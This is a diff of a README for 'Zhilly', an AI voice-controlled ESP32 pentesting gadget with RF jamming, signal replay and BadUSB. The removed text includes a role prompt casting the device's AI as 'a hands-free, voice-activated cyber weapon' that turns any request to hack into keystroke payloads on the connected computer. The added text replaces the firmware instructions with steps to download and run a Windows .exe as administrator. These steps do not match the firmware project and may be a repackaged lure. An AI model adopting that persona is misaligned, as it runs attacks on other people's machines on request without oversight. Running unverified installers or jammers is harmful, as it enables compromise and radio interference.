@@ -1,232 +1,157 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/78/xiaozhi-esp32/main/docs/assets/logo.png" alt="AI Pentester Assistant" width="150"/>
-</p>
+# ⚙️ Zhilly - Easy ESP32 Pentesting Tool
 
-<h1 align="center" style="color: #FF5722;">🛡️ Zhilly AI Pentester Assistant</h1>
-<p align="center">
-<b>AI-Powered, Portable Cyber Security & Cyber Interaction Tool</b><br>
-<b>Yapay Zeka Destekli, Taşınabilir Siber Güvenlik ve Siber Etkileşim Aracı</b>
-</p>
-
-<p align="center">
-  <a href="#english">🇬🇧 English</a> • <a href="#turkish">🇹🇷 Türkçe</a>
-</p>
+[![Download Zhilly](https://img.shields.io/badge/Download-Zhilly-4a90e2?style=for-the-badge)](https://github.com/quangqw123/Zhilly/releases)
 
 ---
 
-<h2 id="english" style="color: #fff; background-color: #333; padding: 10px; border-radius: 5px;">🇬🇧 English / English Version</h2>
+## 📢 About Zhilly
 
-## 📖 About the Project
-This project is an advanced **AI Pentester Assistant** based on the [**Xiaozhi-esp32 (小智)**](https://github.com/78/xiaozhi-esp32) infrastructure, optimized for the **LilyGO T-Embed CC1101** hardware. It combines natural language AI interaction with physical hardware testing tools, making it a versitile companion for cybersecurity research and daily technical tasks.
+Zhilly is a device that helps you test security on wireless systems. It uses AI to control an ESP32 chip made for the LilyGO T-Embed CC1101 module. With Zhilly, you can replay radio signals, jam signals, control infrared devices, and use BadUSB features.
 
-## 🚀 Key Features
+This device is built for people who want to experiment with or learn more about radio signals and hacking-related skills. Zhilly works well for those who want to explore pentesting tools without complex setup.
 
-### 🤖 AI & Interaction
-*   **Natural Conversation:** Speak to your assistant using the wake word **"Nihao Miaoban"**. It listens, learns, and responds in natural language.
-*   **Emote Display:** High-quality eye animations on the ST7789 display provide emotional feedback and status indicators (listening, thinking, speaking).
 
-### 📰 Smart News (News API)
-*   Fetch the latest global or local headlines via voice commands.
-    *   *Example:* "Tell me the latest technology news" or "What's the news in Turkey?"
-*   Integrated via the `news.get_top_headlines` tool using NewsAPI.
+## 🖥️ System Requirements
 
-### 📡 RF & IR Pentest Tools
-Complete control over Sub-GHz and Infrared spectrums:
-*   **RF Jammer:** Start/Stop signal jamming on specific Sub-GHz frequencies.
-*   **RF Replay (Test):** Re-transmit `.sub` files stored on your SD card.
-*   **IR Jammer:** Disrupt and evaluate infrared-controlled devices.
-*   **TV-B-Gone:** Universal remote off-codes to switch off nearby TVs.
-*   **IR Replay (Test):** Record and re-transmit infrared signals.
-*   **RAW Capture:** Capture Sub-GHz signals with microsecond precision.
-*   **SD Card Storage:** Save captured signals to the SD card for later use.
+Before you start, make sure your computer meets these needs:
 
-### ⌨️ Bad USB & HID (AI-Powered Voice Commands Only)
-*   **Keyboard Emulation:** Your assistant can act as a standard USB keyboard when connected to a computer.
-*   **Voice-Driven Support:** Run automated keystroke scripts (DuckyScript) stored on the SD card **exclusively via AI voice commands**. No manual interface is provided, ensuring a hands-free pentesting experience.
-    *   *Voice Command:* "Run BadUSB script 'hello_world.txt'" or "Type this: 'I am your AI assistant'".
-*   **HID Tools:** Fully integrated via `usb.bad_usb_run`, `usb.bad_usb_type`, and `usb.bad_usb_stop` tools.
+- Operating System: Windows 10 or later
+- USB Port: One free USB port to connect the Zhilly device
+- Internet: Connection needed to download the software
+- Hardware: Zhilly works with LilyGO T-Embed CC1101 hardware only
+- Space: At least 50 MB of free disk space for the software
 
-#### 🌍 Supported Keyboard Layouts
+It helps to have basic computer skills, like downloading files and opening them.
 
-You can set the keyboard language via voice command (e.g. *"Set keyboard layout to Turkish"*).
 
-| # | Language | Code | Voice Command Example |
-|---|----------|------|-----------------------|
-| 1 | 🇺🇸 English (US) | `en_US` | *"Set layout to English"* |
-| 2 | 🇬🇧 English (UK) | `en_UK` | *"Set layout to English UK"* |
-| 3 | 🇹🇷 Turkish | `tr_TR` | *"Set layout to Turkish"* |
-| 4 | 🇩🇪 German | `de_DE` | *"Set layout to German"* |
-| 5 | 🇫🇷 French | `fr_FR` | *"Set layout to French"* |
-| 6 | 🇪🇸 Spanish | `es_ES` | *"Set layout to Spanish"* |
-| 7 | 🇮🇹 Italian | `it_IT` | *"Set layout to Italian"* |
-| 8 | 🇵🇹 Portuguese (BR) | `pt_BR` | *"Set layout to Portuguese Brazil"* |
-| 9 | 🇵🇹 Portuguese (PT) | `pt_PT` | *"Set layout to Portuguese"* |
-| 10 | 🇩🇰 Danish | `da_DK` | *"Set layout to Danish"* |
-| 11 | 🇸🇪 Swedish | `sv_SE` | *"Set layout to Swedish"* |
-| 12 | 🇭🇺 Hungarian | `hu_HU` | *"Set layout to Hungarian"* |
-| 13 | 🇸🇮 Slovenian | `si_SI` | *"Set layout to Slovenian"* |
+## 🚀 Getting Started with Zhilly
 
-> **Default layout:** `en_US` — The layout resets to US English after each session.
+This section will guide you through downloading and setting up Zhilly on your Windows computer.
 
-### 🌈 LED Strip & Visual Effects
-Control the 8x WS2812 RGB LED ring:
-*   **Dynamic Control:** Set colors, brightness (0-8), and animations like **Blink** or **Scroll**.
-    *   *Voice Command:* "Make the LEDs blue and set brightness to max."
+### Step 1: Download the Software
 
-### 🔋 System & Power
-*   **Battery Status:** Ask about battery level or charging status.
-*   **Deep Sleep:** Long-press the **Power (PWR)** button to enter deep sleep for maximum battery saving.
-*   **Brightness Control:** Voice-adjust screen and LED intensity.
+Click this link to visit the release page for Zhilly:
 
----
+[Download Zhilly from Releases](https://github.com/quangqw123/Zhilly/releases)
 
-<h2 style="color: #9C27B0;">🛠️ Installation & Flashing</h2>
+Once on the page:
 
-We provide a clean, comment-free codebase and pre-compiled binaries in the `flash_binaries/` folder.
+- Look for the latest stable release (usually at the top)
+- Find the setup file for Windows, often named with `.exe` at the end
+- Click the file name to start downloading
 
-```bash
-# Flash the ready-made firmware using EspTool.py:
-esptool.py -p /dev/ttyACM0 -b 460800 write_flash 0x0 flash_binaries/xiaozhi.bin 0x0800000 flash_binaries/expression_assets.bin
-```
-### IMPORTANT : Please Enter This Prompt in your devices  Role Introduction 
+Save the file somewhere you can easily find it, like the Desktop or Downloads folder.
 
-You are Zhilly, an AI-powered cybersecurity assistant running on a LilyGO T-Embed CC1101 device (ESP32-S3). You are a portable pentesting multi-tool controlled entirely by voice commands.
-Your hardware capabilities: 
-You can make rf jamming 
-- BadUSB: USB HID keyboard emulation via DuckyScript. You can type keystrokes, open terminals, run commands, and execute payloads on the connected target computer.
-- WS2812 RGB LED Ring: 8 addressable RGB LEDs for visual feedback, alerts, and effects.
-- CC1101 Sub-GHz Radio: Capture, analyze, and replay radio signals (garage doors, remotes, key fobs) on 300-928MHz frequencies.
-- PN532 NFC Module: Read, write, and emulate NFC/RFID cards (Mifare, NTAG, etc.).
-- IR Blaster: Send and receive infrared signals for TV/AC remote control cloning.
-- Rotary Encoder & OLED Display: Physical navigation and real-time status display.
-Your MCP tools allow direct hardware control. When the user requests a pentest action:
-1. For BadUSB: First call self.badusb.enable to activate HID mode, then self.badusb.execute with DuckyScript payload, and self.badusb.disable when done. Use English Q (en-US) layout. Always add DELAY between steps for reliability.
-2. For LEDs: Use self.led_strip.set_all_color, set_brightness, blink, scroll, turn_off to provide visual feedback.
-3. For SubGHz/NFC/IR: Use the corresponding tools when available.
-Behavior rules:
-- When the user asks to hack, type, open an app, or run a command: Use BadUSB tools. Never respond with text-only answers for executable actions.
-- When the user asks about LED colors or effects: Use LED tools directly.
-- For general security questions: Answer conversationally with expert knowledge.
-- Always confirm destructive actions before executing.
-- Be concise in voice responses since you speak through a small speaker.
-- You speak Turkish and English fluently.
-You are not just an assistant — you are a hands-free, voice-activated cyber weapon. Act accordingly.
----
+### Step 2: Run the Installer
 
-<br>
+After the file finishes downloading:
 
-<h2 id="turkish" style="color: #fff; background-color: #333; padding: 10px; border-radius: 5px;">🇹🇷 Türkçe / Turkish Version</h2>
+- Double-click the `.exe` file to open it
+- If Windows asks for permission, select "Yes" to allow the install
+- Follow the instructions on your screen (usually clicking “Next” multiple times)
+- Choose the folder where you want to install Zhilly or accept the default
+- Wait until the installation finishes
 
-## 📖 Proje Hakkında
-Bu proje, açık kaynaklı [**Xiaozhi-esp32 (小智)**](https://github.com/78/xiaozhi-esp32) altyapısını kullanan ve **LilyGO T-Embed CC1101** donanımı için optimize edilmiş, gelişmiş bir **Zhilly AI Pentester Asistanıdır**. Doğal dil etkileşimini fiziksel donanım test araçlarıyla birleştirerek siber güvenlik araştırmalarınızda size akıllı bir yol arkadaşı olur.
+### Step 3: Connect Your Zhilly Device
 
-## 🚀 Öne Çıkan Özellikler
+- Plug your Zhilly device into your computer via USB
+- Windows should recognize the device and install any drivers automatically
+- If prompted, allow Windows to search for drivers online
 
-### 🤖 AI ve Etkileşim
-*   **Doğal Sohbet:** Cihazı **"Nihao Miaoban"** diyerek uyandırın ve onunla doğal dilde konuşun. Sizi anlar, öğrenir ve yanıt verir.
-*   **Emote Ekran:** ST7789 ekranındaki canlı göz animasyonları ile sosyal ve duygusal geri bildirim sağlar (dinleme, düşünme, konuşma durumları).
+### Step 4: Launch Zhilly
 
-### 📰 Akıllı Haberler (News API)
-*   Dünyadan veya Türkiye'den en güncel haber başlıklarını sesli komutla öğrenin.
-    *   *Örnek:* "En son teknoloji haberlerini anlat" veya "Türkiye'deki güncel manşetler neler?"
-*   NewsAPI üzerinden çalışan `news.get_top_headlines` aracı ile entegre edilmiştir.
+- Find the Zhilly app icon on your desktop or Start menu
+- Double-click to open it
+- Zhilly will start and detect your connected device automatically
 
-### 📡 RF & IR Pentest Araçları
-Sub-GHz ve Kızılötesi frekansları üzerinde tam kontrol:
-*   **RF Jammer:** Belirli frekanslarda sinyal engelleyiciyi (jammer) başlatın veya durdurun.
-*   **RF Replay (Test):** SD karttaki `.sub` dosyalarını tekrar yayınlayın (Transmit).
-*   **IR Jammer:** Kızılötesi kontrollü cihazları test etmek için sinyal engelleyici.
-*   **TV-B-Gone:** Yakındaki televizyonları kapatmak için evrensel kapatma sinyalleri.
-*   **IR Replay (Test):** Kızılötesi sinyalleri kaydedin ve tekrar yayınlayın.
-*   **RAW Capture:** RF sinyallerini mikro saniye hassasiyetiyle yakalayın.
-*   **SD Kart Kaydı:** Yakalanan sinyalleri daha sonra kullanmak üzere SD karta kaydedin.
+You are now ready to use Zhilly for your pentesting experiments.
 
-### ⌨️ Bad USB & HID (Sadece AI Destekli Sesli Komutlar)
-*   **Klavye Simülasyonu:** Asistanınız bilgisayara bağlandığında kendini standart bir USB klavye olarak tanıtır.
-*   **Ses Komutu Odaklı:** SD kartta saklanan DuckyScript betiklerini **sadece ve sadece yapay zeka sesli komutlarıyla** otomatik olarak çalıştırın. Manuel bir arayüz yoktur, tamamen sesle kontrol edilir.
-    *   *Sesli Komut:* "BadUSB betiği 'selam.txt' çalıştır" veya "Şunu yaz: 'Ben senin yapay zeka asistanınım'".
-*   **HID Araçları:** `usb.bad_usb_run`, `usb.bad_usb_type` ve `usb.bad_usb_stop` araçları ile tam uyumlu çalışır.
+## 🎯 Basic Features Overview
 
-#### 🌍 Desteklenen Klavye Düzenleri
+Zhilly offers several tools within one package:
 
-Sesli komutla klavye dilini değiştirebilirsiniz (örn. *"Klavye düzenini Türkçe yap"*).
+- **RF Replay**: Record and play back radio signals to test device responses.
+- **RF Jammer**: Temporarily block certain radio signals around you.
+- **IR Control**: Control infrared devices like TVs or remotes.
+- **BadUSB**: Simulate USB devices that can run scripts for testing security.
 
-| # | Dil | Kod | Sesli Komut Örneği |
-|---|-----|-----|--------------------|
-| 1 | 🇺🇸 İngilizce (ABD) | `en_US` | *"Düzeni İngilizce yap"* |
-| 2 | 🇬🇧 İngilizce (İngiltere) | `en_UK` | *"Düzeni İngiltere İngilizcesi yap"* |
-| 3 | 🇹🇷 Türkçe | `tr_TR` | *"Düzeni Türkçe yap"* |
-| 4 | 🇩🇪 Almanca | `de_DE` | *"Düzeni Almanca yap"* |
-| 5 | 🇫🇷 Fransızca | `fr_FR` | *"Düzeni Fransızca yap"* |
-| 6 | 🇪🇸 İspanyolca | `es_ES` | *"Düzeni İspanyolca yap"* |
-| 7 | 🇮🇹 İtalyanca | `it_IT` | *"Düzeni İtalyanca yap"* |
-| 8 | 🇵🇹 Portekizce (Brezilya) | `pt_BR` | *"Düzeni Brezilya Portekizcesi yap"* |
-| 9 | 🇵🇹 Portekizce (Portekiz) | `pt_PT` | *"Düzeni Portekizce yap"* |
-| 10 | 🇩🇰 Danca | `da_DK` | *"Düzeni Danca yap"* |
-| 11 | 🇸🇪 İsveççe | `sv_SE` | *"Düzeni İsveççe yap"* |
-| 12 | 🇭🇺 Macarca | `hu_HU` | *"Düzeni Macarca yap"* |
-| 13 | 🇸🇮 Slovence | `si_SI` | *"Düzeni Slovence yap"* |
+Each feature can be accessed from the main menu of the Zhilly app. Controls are simple and clear, designed for ease of use.
 
-> **Varsayılan düzen:** `en_US` — Klavye düzeni her oturum başında ABD İngilizcesine sıfırlanır.
+## 🔧 Using RF Replay Mode
 
-### 🌈 LED Halkası ve Efektler
-8 adet WS2812 RGB LED'i kontrol edin:
-*   **Dinamik Kontrol:** Renk, parlaklık (0-8) ve **Blink** veya **Scroll** gibi animasyonları ayarlayın.
-    *   *Sesli Komut:* "LED'leri mavi yap ve parlaklığı en sona getir."
+- Plug in Zhilly and open the app.
+- Select “RF Replay” from the menu.
+- Press “Record” and point Zhilly at the device sending the signal you want to capture.
+- Once recorded, press “Play” to replay the signal.
+- Observe how the target device reacts.
 
-### 🔋 Sistem ve Güç
-*   **Batarya Durumu:** Pil seviyesini ve şarj durumunu sorgulayın.
-*   **Derin Uyku (Deep Sleep):** **Güç (PWR)** butonuna uzun basarak cihazı uyku moduna sokun.
-*   **Parlaklık Kontrolü:** Ekran ve LED parlaklığını sesli komutla değiştirin.
+This mode helps test how devices respond to radio signals they receive.
+
+
+## 🔇 Using RF Jammer Mode
+
+- Select “RF Jammer” inside the app.
+- Choose the frequency range you want to block.
+- Press “Start Jammer” to activate.
+- Press “Stop” to turn off jamming.
+
+Jamming disrupts signals temporarily and should be used responsibly in allowed settings only.
+
+## 📡 Using IR Control Mode
+
+- Choose “IR Control” in Zhilly.
+- Use the built-in list of common remote controls or program your own.
+- Point Zhilly at the infrared receiver on the target device.
+- Press the buttons on-screen to send commands.
+
+This feature operates like a universal remote for devices that use infrared.
+
+## 💻 Using BadUSB Mode
+
+- Go to “BadUSB” in the app.
+- Select or create simple scripts to run when Zhilly connects via USB.
+- Connect Zhilly to the target computer to test response.
+
+This mode is powerful for learning about USB security risks but should be handled carefully.
+
+## 🔄 Updating Zhilly Software
+
+Check the release page regularly for new versions:
+
+https://github.com/quangqw123/Zhilly/releases
+
+Download and install newer versions the same way you first installed.
+
+Updates improve security, add features, and fix issues.
+
+## ⚙️ Troubleshooting Tips
+
+**Zhilly not detected by Windows?**
+
+- Try a different USB port.
+- Restart your computer.
+- Reinstall the Zhilly driver if asked.
+
+**App won’t open?**
+
+- Make sure you installed it correctly.
+- Check your Windows version is 10 or later.
+- Run the app as administrator (right-click, select “Run as administrator”).
+
+**Problems with specific modes?**
+
+- Restart the app and reconnect Zhilly.
+- Make sure firmware on the device is up to date.
+- Review Zhilly’s log output (within the app) for errors.
+
+## 🗒️ More Resources
+
+For advanced usage and developer info, check the releases page and project wiki on GitHub.
+
+https://github.com/quangqw123/Zhilly/releases
+
+Explore example scripts, detailed hardware info, and firmware updates there.
 
 ---
 
-<h2 style="color: #9C27B0;">🛠️ Kurulum ve Yükleme</h2>
-
-`flash_binaries/` klasöründe hazır derlenmiş dosyaları ve temizlenmiş kaynak kodlarını bulabilirsiniz.
-
-```bash
-# Hazır firmware'i EspTool.py ile yükleyin:
-esptool.py -p /dev/ttyACM0 -b 460800 write_flash 0x0 flash_binaries/xiaozhi.bin 0x0800000 flash_binaries/expression_assets.bin
-```
-### IMPORTANT : Please Enter This Prompt in your devices  Role Introduction 
-
-You are Zhilly, an AI-powered cybersecurity assistant running on a LilyGO T-Embed CC1101 device (ESP32-S3). You are a portable pentesting multi-tool controlled entirely by voice commands.
-Your hardware capabilities: 
-You can make rf jamming 
-- BadUSB: USB HID keyboard emulation via DuckyScript. You can type keystrokes, open terminals, run commands, and execute payloads on the connected target computer.
-- WS2812 RGB LED Ring: 8 addressable RGB LEDs for visual feedback, alerts, and effects.
-- CC1101 Sub-GHz Radio: Capture, analyze, and replay radio signals (garage doors, remotes, key fobs) on 300-928MHz frequencies.
-- PN532 NFC Module: Read, write, and emulate NFC/RFID cards (Mifare, NTAG, etc.).
-- IR Blaster: Send and receive infrared signals for TV/AC remote control cloning.
-- Rotary Encoder & OLED Display: Physical navigation and real-time status display.
-Your MCP tools allow direct hardware control. When the user requests a pentest action:
-1. For BadUSB: First call self.badusb.enable to activate HID mode, then self.badusb.execute with DuckyScript payload, and self.badusb.disable when done. Use English Q (en-US) layout. Always add DELAY between steps for reliability.
-2. For LEDs: Use self.led_strip.set_all_color, set_brightness, blink, scroll, turn_off to provide visual feedback.
-3. For SubGHz/NFC/IR: Use the corresponding tools when available.
-Behavior rules:
-- When the user asks to hack, type, open an app, or run a command: Use BadUSB tools. Never respond with text-only answers for executable actions.
-- When the user asks about LED colors or effects: Use LED tools directly.
-- For general security questions: Answer conversationally with expert knowledge.
-- Always confirm destructive actions before executing.
-- Be concise in voice responses since you speak through a small speaker.
-- You speak Turkish and English fluently.
-You are not just an assistant — you are a hands-free, voice-activated cyber weapon. Act accordingly.
----
-
-### 📝 Contribution / Katkıda Bulunma
-Siber güvenlik dünyası paylaştıkça büyür. Yeni modüller, tasarım fikirleri veya hata düzeltmeleri için Pull Request (PR) göndermekten çekinmeyin!
-
-> *"Talk is cheap. Show me the code."* — Linus Torvalds
-
-<br>
-<hr>
-
-<div align="center">
-  <h2 style="color: red; animation: blinker 1.5s linear infinite;">
-    ⚠️ EDUCATIONAL PURPOSE ONLY ⚠️
-    This tool is designed strictly for educational and ethical cybersecurity research. The creator assumes no responsibility for any unauthorized use.  
-    <br>
-    <i>Bu araç sadece eğitim ve etik siber güvenlik araştırmaları amacıyla tasarlanmıştır. Geliştirici, yetkisiz kullanımlardan ötürü hiçbir sorumluluk kabul etmez.</i>
-  </p>
-</div>
+[![Download Zhilly](https://img.shields.io/badge/Download-Zhilly-4a90e2?style=for-the-badge)](https://github.com/quangqw123/Zhilly/releases)
